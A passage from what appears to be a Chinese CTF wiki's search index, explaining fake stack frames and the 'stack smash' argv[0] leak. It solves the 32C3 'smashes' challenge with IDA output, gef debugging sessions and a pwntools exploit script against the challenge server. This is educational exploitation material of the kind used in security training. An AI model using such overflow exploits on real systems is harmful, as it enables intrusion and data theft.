\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u8bf4\u4e00\u4e0b\u57fa\u672c\u7684\u63a7\u5236\u8fc7\u7a0b\u3002    \u5728\u6709\u6808\u6ea2\u51fa\u7684\u7a0b\u5e8f\u6267\u884cleave\u65f6\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4    move ebp, esp \uff0c\u8fd9\u4f1a\u5c06esp\u4e5f\u6307\u5411\u5f53\u524d\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684ebp\u57fa\u5730\u5740\u5904\u3002    pop ebp\uff0c \u8fd9\u4f1a\u5c06\u6808\u4e2d\u5b58\u653e\u7684fake ebp\u7684\u503c\u8d4b\u7ed9ebp\u3002\u5373\u6267\u884c\u5b8c\u6307\u4ee4\u4e4b\u540e\uff0cebp\u4fbf\u6307\u5411\u4e86ebp2\uff0c\u4e5f\u5c31\u662f\u4fdd\u5b58\u4e86ebp2\u6240\u5728\u7684\u5730\u5740\u3002    \u6267\u884cret\u6307\u4ee4\uff0c\u4f1a\u518d\u6b21\u6267\u884cleave ret\u6307\u4ee4\u3002    \u6267\u884cleave\u6307\u4ee4\uff0c\u5176\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4    move ebp, esp \uff0c\u8fd9\u4f1a\u5c06esp\u6307\u5411ebp2\u3002    pop ebp\uff0c\u6b64\u65f6\uff0c\u4f1a\u5c06ebp\u7684\u5185\u5bb9\u8bbe\u7f6e\u4e3aebp2\u7684\u503c\uff0c\u540c\u65f6esp\u4f1a\u6307\u5411target function\u3002    \u6267\u884cret\u6307\u4ee4\uff0c\u8fd9\u65f6\u5019\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884ctargetfunction\uff0c\u5f53\u5176\u8fdb\u884c\u7a0b\u5e8f\u7684\u65f6\u5019\u4f1a\u6267\u884c    push ebp,\u4f1a\u5c06ebp2\u503c\u538b\u5165\u6808\u4e2d\uff0c    move esp, ebp\uff0c\u5c06ebp\u6307\u5411\u5f53\u524d\u57fa\u5730\u5740\u3002    \u6b64\u65f6\u7684\u6808\u7ed3\u6784\u5982\u4e0b  ebp\n|\nv\nebp2|leave ret addr|arg1|arg2    \u5f53\u7a0b\u5e8f\u6267\u884c\u5e08\uff0c\u5176\u4f1a\u6b63\u5e38\u7533\u8bf7\u7a7a\u95f4\uff0c\u540c\u65f6\u6211\u4eec\u5728\u6808\u4e0a\u4e5f\u5b89\u6392\u4e86\u8be5\u51fd\u6570\u5bf9\u5e94\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4f1a\u6b63\u5e38\u6267\u884c\u3002    \u7a0b\u5e8f\u7ed3\u675f\u540e\uff0c\u5176\u53c8\u4f1a\u6267\u884c\u4e24\u6b21 leave ret addr\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5728ebp2\u5904\u5e03\u7f6e\u597d\u4e86\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4e00\u76f4\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u3002    \u53ef\u4ee5\u770b\u51fa\u5728fake frame\u4e2d\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u9700\u6c42\u5c31\u662f\uff0c\u6211\u4eec\u5fc5\u987b\u5f97\u6709\u4e00\u5757\u53ef\u4ee5\u5199\u7684\u5185\u5b58\uff0c\u5e76\u4e14\u6211\u4eec\u8fd8\u77e5\u9053\u8fd9\u5757\u5185\u5b58\u7684\u5730\u5740\uff0c\u8fd9\u4e00\u70b9\u4e0estack pivoting\u76f8\u4f3c\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_6", 
            "text": "\u76ee\u524d\u6765\u8bf4\uff0c\u6211\u5728exploit-exercise\u7684fusion level2\u4e2d\u5229\u7528\u8fc7\u8fd9\u4e2a\u6280\u5de7\uff0c\u5176\u5b83\u5730\u65b9\u6682\u65f6\u8fd8\u672a\u9047\u5230\uff0c\u9047\u5230\u7684\u65f6\u5019\u518d\u8fdb\u884c\u8865\u5145\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_7", 
            "text": "\u53c2\u8003\u9605\u8bfb   http://www.xfocus.net/articles/200602/851.html  http://phrack.org/issues/58/4.html", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#stack-smash", 
            "text": "", 
            "title": "Stack smash"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_8", 
            "text": "\u5728\u7a0b\u5e8f\u52a0\u4e86canary\u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u8bfb\u53d6\u7684buffer\u8986\u76d6\u4e86\u5bf9\u5e94\u7684\u503c\u65f6\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u62a5\u9519\uff0c\u800c\u4e00\u822c\u6765\u8bf4\u6211\u4eec\u5e76\u4e0d\u4f1a\u5173\u5fc3\u62a5\u9519\u4fe1\u606f\u3002\u800cstack smash\u6280\u5de7\u5219\u5c31\u662f\u5229\u7528\u6253\u5370\u8fd9\u4e00\u4fe1\u606f\u7684\u7a0b\u5e8f\u6765\u5f97\u5230\u6211\u4eec\u60f3\u8981\u7684\u5185\u5bb9\u3002\u8fd9\u662f\u56e0\u4e3a\u5728\u7a0b\u5e8f\u53d1\u73b0canary\u4fdd\u62a4\u4e4b\u540e\uff0c\u5982\u679c\u53d1\u73b0canary\u88ab\u4fee\u6539\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u6267\u884c__stack_chk_fail\u51fd\u6570\u6765\u6253\u5370argv[0]\u6307\u9488\u6240\u6307\u5411\u7684\u5b57\u7b26\u4e32\uff0c\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u6307\u9488\u6307\u5411\u4e86\u7a0b\u5e8f\u540d\u3002\u5176\u4ee3\u7801\u5982\u4e0b  void   __attribute__   (( noreturn ))   __stack_chk_fail   ( void )  { \n   __fortify_fail   ( stack smashing detected );  }  void   __attribute__   (( noreturn ))   internal_function   __fortify_fail   ( const   char   * msg )  { \n   /* The loop is added only to keep gcc happy.  */ \n   while   ( 1 ) \n     __libc_message   ( 2 ,   *** %s ***: %s terminated \\n , \n                     msg ,   __libc_argv [ 0 ]   ?:   unknown );  }   \u6240\u4ee5\u8bf4\u5982\u679c\u6211\u4eec\u5229\u7528\u6808\u6ea2\u51fa\u8986\u76d6argv[0]\u4e3a\u6211\u4eec\u60f3\u8981\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u7684\u5730\u5740\uff0c\u90a3\u4e48\u5728__fortify_fail\u51fd\u6570\u4e2d\u5c31\u4f1a\u8f93\u51fa\u6211\u4eec\u60f3\u8981\u7684\u4fe1\u606f\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_9", 
            "text": "\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52015\u5e7432C3 CTF smashes\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u8be5\u9898\u76ee\u5728jarvisoj\u4e0a\u6709\u590d\u73b0\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_10", 
            "text": "\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3a64\u4f4d\uff0c\u4e3b\u8981\u5f00\u542f\u4e86Canary\u4fdd\u62a4\u4ee5\u53caNX\u4fdd\u62a4\uff0c\u4ee5\u53caFORTIFY\u4fdd\u62a4\u3002  \u279c  stacksmashes git: ( master )  \u2717 checksec smashes\n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 ) \n    FORTIFY:  Enabled", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_11", 
            "text": "ida\u770b\u4e00\u4e0b  __int64   sub_4007E0 ()  { \n   __int64   v0 ;   // rax@1 \n   __int64   v1 ;   // rbx@2 \n   int   v2 ;   // eax@3 \n   __int64   v4 ;   // [sp+0h] [bp-128h]@1 \n   __int64   v5 ;   // [sp+108h] [bp-20h]@1 \n\n   v5   =   * MK_FP ( __FS__ ,   40LL ); \n   __printf_chk ( 1LL ,   ( __int64 ) Hello! \\n What s your name?  ); \n   LODWORD ( v0 )   =   _IO_gets (( __int64 ) v4 ); \n   if   (   ! v0   )  LABEL_9 : \n     _exit ( 1 ); \n   v1   =   0LL ; \n   __printf_chk ( 1LL ,   ( __int64 ) Nice to meet you, %s. \\n Please overwrite the flag:  ); \n   while   (   1   ) \n   { \n     v2   =   _IO_getc ( stdin ); \n     if   (   v2   ==   - 1   ) \n       goto   LABEL_9 ; \n     if   (   v2   ==   \\n   ) \n       break ; \n     byte_600D20 [ v1 ++ ]   =   v2 ; \n     if   (   v1   ==       ) \n       goto   LABEL_8 ; \n   } \n   memset (( void   * )(( signed   int ) v1   +   0x600D20LL ),   0 ,   ( unsigned   int )( 32   -   v1 ));  LABEL_8 : \n   puts ( Thank you, bye! ); \n   return   * MK_FP ( __FS__ ,   40LL )   ^   v5 ;  }   \u5f88\u663e\u7136\uff0c\u7a0b\u5e8f\u5728_IO_gets((__int64) v4);\u5b58\u5728\u6808\u6ea2\u51fa\u3002  \u6b64\u5916\uff0c\u7a0b\u5e8f\u4e2d\u8fd8\u63d0\u793a\u8981overwrite flag\u3002\u800c\u4e14\u53d1\u73b0\u7a0b\u5e8f\u5f88\u6709\u610f\u601d\u7684\u5728while\u5faa\u73af\u4e4b\u540e\u6267\u884c\u4e86\u8fd9\u6761\u8bed\u53e5     memset (( void   * )(( signed   int ) v1   +   0x600D20LL ),   0 ,   ( unsigned   int )( 32   -   v1 ));   \u53c8\u770b\u4e86\u770b\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u5185\u5bb9\uff0c\u8bf4\u660e\u7a0b\u5e8f\u7684flag\u5c31\u5728\u8fd9\u91cc\u554a\u3002  .data:0000000000600D20 ; char aPctfHereSTheFl[]\n.data:0000000000600D20 aPctfHereSTheFl db  PCTF{Here ,27h, s the flag on server} ,0  \u4f46\u662f\u5982\u679c\u6211\u4eec\u76f4\u63a5\u5229\u7528\u6808\u6ea2\u51fa\u8f93\u51fa\u8be5\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u53ef\u884c\u7684\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u8bfb\u5165\u7684\u5185\u5bb9 byte_600D20[v1++] = v2; \u4e5f\u6070\u6070\u5c31\u662f\u8be5\u5757\u5185\u5b58\uff0c\u8fd9\u4f1a\u76f4\u63a5\u5c06\u5176\u8986\u76d6\u6389\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u9700\u8981\u5229\u7528\u4e00\u4e2a\u6280\u5de7\u4e86   \u5728EFL\u5185\u5b58\u6620\u5c04\u65f6\uff0cbss\u6bb5\u4f1a\u88ab\u6620\u5c04\u4e24\u6b21\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u5904\u7684\u5730\u5740\u6765\u8fdb\u884c\u8f93\u51fa\uff0c\u53ef\u4ee5\u4f7f\u7528gdb\u7684find\u6765\u8fdb\u884c\u67e5\u627e\u3002", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#flag", 
            "text": "\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u8f7dmemset\u51fd\u6570\u5904\uff0c\u7136\u540e\u8bfb\u53d6\u76f8\u5e94\u7684\u5185\u5bb9\u5982\u4e0b  gef \u27a4    c  Continuing.  Hello !  What s   your   name ?   qqqqqqq  Nice   to   meet   you ,   qqqqqqq.  Please   overwrite   the   flag :   222222222  Breakpoint   1 ,   __memset_avx2   ()   at   .. / sysdeps / x86_64 / multiarch / memset-avx2.S : 38  38    .. / sysdeps / x86_64 / multiarch / memset-avx2.S :   \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55 .  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code:i386: x86-64   ] \u2500\u2500\u2500\u2500 \n    0 x7ffff7b7f920   __memset_chk_avx2 + 0   cmp      rcx ,   rdx \n    0 x7ffff7b7f923   __memset_chk_avx2 + 3   jb       0x7ffff7b24110   __GI___chk_fail \n    0 x7ffff7b7f929                    nop      DWORD   PTR   [ rax + 0x0 ] \n  \u2192   0 x7ffff7b7f930   __memset_avx2 + 0   vpxor    xmm0 ,   xmm0 ,   xmm0 \n    0 x7ffff7b7f934   __memset_avx2 + 4   vmovd    xmm1 ,   esi \n    0 x7ffff7b7f938   __memset_avx2 + 8   lea      rsi ,   [ rdi + rdx * 1 ] \n    0 x7ffff7b7f93c   __memset_avx2 + 12   mov      rax ,   rdi  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 x7fffffffda38 ,   l8 ]  8  0 x00007fffffffda38 \u2502+ 0x00 :   0x0000000000400878    \u2192     mov   edi ,   0x40094e    \u2190   $rsp  0 x00007fffffffda40 \u2502+ 0x08 :   0x0071717171717171   ( qqqqqqq ? )  0 x00007fffffffda48 \u2502+ 0x10 :   0x0000000000000000  0 x00007fffffffda50 \u2502+ 0x18 :   0x0000000000000000  0 x00007fffffffda58 \u2502+ 0x20 :   0x0000000000000000  0 x00007fffffffda60 \u2502+ 0x28 :   0x0000000000000000  0 x00007fffffffda68 \u2502+ 0x30 :   0x0000000000000000  0 x00007fffffffda70 \u2502+ 0x38 :   0x0000000000000000  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  [ #0] 0x7ffff7b7f930 \u2192 Name: __memset_avx2()  [ #1] 0x400878 \u2192 mov edi, 0x40094e  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    find   22222  Argument   required   ( expression   to   compute ).  gef \u27a4    find   22222  No   symbol   22222   in   current   context.  gef \u27a4    grep   22222  [+]   Searching   22222   in   memory  [+]   In   / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes ( 0x600000 - 0x601000 ),   permission = rw- \n   0 x600d20   -   0x600d3f    \u2192     222222222 s   the   flag   on   server }   [ + ]   In   [ heap ] ( 0x601000 - 0x622000 ),   permission = rw- \n   0 x601010   -   0x601019    \u2192     222222222   gef \u27a4    grep   PCTF  [+]   Searching   PCTF   in   memory  [+]   In   / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes ( 0x400000 - 0x401000 ),   permission = r-x \n   0 x400d20   -   0x400d3f    \u2192     PCTF { Here s   the   flag   on   server }    \u53ef\u4ee5\u770b\u51fa\u6211\u4eec\u8bfb\u5165\u76842222\u5df2\u7ecf\u8986\u76d6\u4e860x600d20\u5904\u7684flag\uff0c\u4f46\u662f\u6211\u4eec\u5728\u5185\u5b58\u76840x400d20\u5904\u4ecd\u7136\u627e\u5230\u4e86\u8fd9\u4e2aflag\u7684\u5907\u4efd\uff0c\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u53ef\u4ee5\u5c06\u5176\u8f93\u51fa\u3002\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u786e\u5b9a\u4e86flag\u7684\u5730\u5740\u3002", 
            "title": "\u786e\u5b9aflag\u5730\u5740"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_12", 
            "text": "\u4e0b\u9762\uff0c\u6211\u4eec\u786e\u5b9aargv[0]\u8ddd\u79bb\u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u3002  \u9996\u5148\u4e0b\u65ad\u70b9\u5728main\u51fd\u6570\u5165\u53e3\u5904\uff0c\u5982\u4e0b  gef \u27a4    b   * 0x00000000004006D0  Breakpoint   1   at   0x4006d0  gef \u27a4    r  Starting   program :   / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / stacksmashes / smashes   Breakpoint   1 ,   0x00000000004006d0   in   ??   () \n  code:i386: x86-64   ] \u2500\u2500\u2500\u2500 \n      0 x4006c0   _IO_gets@plt + 0   jmp      QWORD   PTR   [ rip + 0x20062a ]          # 0x600cf0  _IO_gets@got.plt \n      0x4006c6   _IO_gets@plt + 6   push     0x9 \n      0 x4006cb   _IO_gets@plt + 11   jmp      0x400620 \n  \u2192     0 x4006d0                    sub      rsp ,   0x8 \n      0 x4006d4                    mov      rdi ,   QWORD   PTR   [ rip + 0x200665 ]          # 0x600d40  stdout \n      0x4006db                    xor      esi ,   esi \n      0 x4006dd                    call     0x400660   setbuf@plt  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 x7fffffffdb78 ,   l8 ]  8  0 x00007fffffffdb78 \u2502+ 0x00 :   0x00007ffff7a2d830    \u2192    __libc_start_main + 240   mov   edi ,   eax      \u2190   $rsp  0 x00007fffffffdb80 \u2502+ 0x08 :   0x0000000000000000  0 x00007fffffffdb88 \u2502+ 0x10 :   0x00007fffffffdc58    \u2192    0x00007fffffffe00b    \u2192    / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / exam [...]  0 x00007fffffffdb90 \u2502+ 0x18 :   0x0000000100000000  0 x00007fffffffdb98 \u2502+ 0x20 :   0x00000000004006d0    \u2192     sub   rsp ,   0x8  0 x00007fffffffdba0 \u2502+ 0x28 :   0x0000000000000000  0 x00007fffffffdba8 \u2502+ 0x30 :   0x48c916d3cf726fe3  0 x00007fffffffdbb0 \u2502+ 0x38 :   0x00000000004006ee    \u2192     xor   ebp ,   ebp  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  [ #0] 0x4006d0 \u2192 sub rsp, 0x8  [ #1] 0x7ffff7a2d830 \u2192 Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init= optimized out , fini= optimized out , rtld_fini= optimized out , stack_end=0x7fffffffdc48)  --- Type   return   to   continue ,   or   q   return   to   quit---  [ #2] 0x400717 \u2192 hlt    \u53ef\u4ee5\u770b\u51fa0x00007fffffffe00b\u6307\u5411\u7a0b\u5e8f\u540d\uff0c\u5176\u81ea\u7136\u5c31\u662fargv[0]\uff0c\u6240\u4ee5\u6211\u4eec\u4fee\u6539\u7684\u5185\u5bb9\u5c31\u662f\u8fd9\u4e2a\u5730\u5740\u3002\u540c\u65f60x00007fffffffdc58\u5904\u4fdd\u7559\u7740\u8be5\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u771f\u6b63\u9700\u8981\u7684\u5730\u5740\u662f0x00007fffffffdc58\u3002  \u6b64\u5916\uff0c\u6839\u636e\u6c47\u7f16\u4ee3\u7801  .text: 00000000004007 E0                   push      rbp  .text: 00000000004007 E1                   mov       esi ,   offset   aHelloWhatSYour   ;  Hello!\\nWhat s your name?   .text : 00000000004007 E6                   mov       edi ,   1  .text: 00000000004007 EB                   push      rbx  .text: 00000000004007 EC                   sub       rsp ,   118 h  .text: 00000000004007 F3                   mov       rax ,   fs : 28 h  .text: 00000000004007 FC                   mov       [ rsp + 128 h + var_20 ],   rax  .text: 0000000000400804                   xor       eax ,   eax  .text: 0000000000400806                   call      ___printf_chk  .text: 000000000040080 B                   mov       rdi ,   rsp  .text: 000000000040080 E                   call      __IO_gets   \u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u8bfb\u5165\u7684\u5b57\u7b26\u4e32\u7684\u8d77\u59cb\u5730\u5740\u5176\u5b9e\u5c31\u662f\u8c03\u7528__IO_gets\u4e4b\u524d\u7684rsp\uff0c\u6240\u4ee5\u6211\u4eec\u628a\u65ad\u70b9\u4e0b\u5728call\u5904\uff0c\u5982\u4e0b  gef \u27a4    b   * 0x000000000040080E  Breakpoint   2   at   0x40080e  gef \u27a4    c  Continuing.  Hello !  What s   your   name ?   Breakpoint   2 ,   0x000000000040080e   in   ??   ()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code:i386: x86-64   ] \u2500\u2500\u2500\u2500 \n      0 x400804                    xor      eax ,   eax \n      0 x400806                    call     0x4006b0   __printf_chk@plt \n      0 x40080b                    mov      rdi ,   rsp \n  \u2192     0 x40080e                    call     0x4006c0   _IO_gets@plt \n    \u21b3      0 x4006c0   _IO_gets@plt + 0   jmp      QWORD   PTR   [ rip + 0x20062a ]          # 0x600cf0  _IO_gets@got.plt \n         0x4006c6   _IO_gets@plt + 6   push     0x9 \n         0 x4006cb   _IO_gets@plt + 11   jmp      0x400620 \n         0 x4006d0                    sub      rsp ,   0x8  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 x7fffffffda40 ,   l8 ]  8  0 x00007fffffffda40 \u2502+ 0x00 :   0x0000ff0000000000       \u2190   $rsp ,   $rdi  0 x00007fffffffda48 \u2502+ 0x08 :   0x0000000000000000  0 x00007fffffffda50 \u2502+ 0x10 :   0x0000000000000000  0 x00007fffffffda58 \u2502+ 0x18 :   0x0000000000000000  0 x00007fffffffda60 \u2502+ 0x20 :   0x0000000000000000  0 x00007fffffffda68 \u2502+ 0x28 :   0x0000000000000000  0 x00007fffffffda70 \u2502+ 0x30 :   0x0000000000000000  0 x00007fffffffda78 \u2502+ 0x38 :   0x0000000000000000  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  [ #0] 0x40080e \u2192 call 0x4006c0  _IO_gets@plt  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    print   $rsp  $1   =   ( void   *)   0x7fffffffda40   \u53ef\u4ee5\u770b\u51farsp\u7684\u503c\u4e3a0x7fffffffda40\uff0c\u90a3\u4e48\u76f8\u5bf9\u504f\u79fb\u4e3a    0x00007fffffffdc58 - 0x7fffffffda40  536    hex ( 536 )  0x218", 
            "title": "\u786e\u5b9a\u504f\u79fb"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_13", 
            "text": "\u6211\u4eec\u6784\u9020\u5229\u7528\u7a0b\u5e8f\u5982\u4e0b  from   pwn   import   *  context . log_level   =   debug  smash   =   ELF ( ./smashes )  if   args [ REMOTE ]: \n     sh   =   remote ( pwn.jarvisoj.com ,   9877 )  else : \n     sh   =   process ( ./smashes )  argv_addr   =   0x00007fffffffdc58  name_addr   =   0x7fffffffda40  flag_addr   =   0x600D20  another_flag_addr   =   0x400d20  payload   =   a   *   ( argv_addr   -   name_addr )   +   p64 ( another_flag_addr )  sh . recvuntil ( name?  )  sh . sendline ( payload )  sh . recvuntil ( flag:  )  sh . sendline ( bb )  data   =   sh . recv ()  sh . interactive ()   \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u5c31\u5f97\u5230\u4e86flag\uff0c\u6ca1\u6709\u51fa\u73b0\u7f51\u4e0a\u8bf4\u7684\u5f97\u4e0d\u5230flag\u7684\u60c5\u51b5\u3002", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/stackoverflow/others/#_14", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/medium_rop/", 
            "text": "\u4e2d\u7ea7ROP\n\n\n\u4e2d\u7ea7ROP\u4e3b\u8981\u662f\u4f7f\u7528\u4e86\u4e00\u4e9b\u6bd4\u8f83\u5de7\u5999\u7684Gadgets\u3002\n\n\nret2__libc_scu_init\n\n\n\u539f\u7406\n\n\n\u572864\u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u7684\uff0c\u4f46\u662f\u5927\u591a\u6570\u65f6\u5019\uff0c\u6211\u4eec\u5f88\u96be\u627e\u5230\u6bcf\u4e00\u4e2a\u5bc4\u5b58\u5668\u5bf9\u5e94\u7684gadgets\u3002 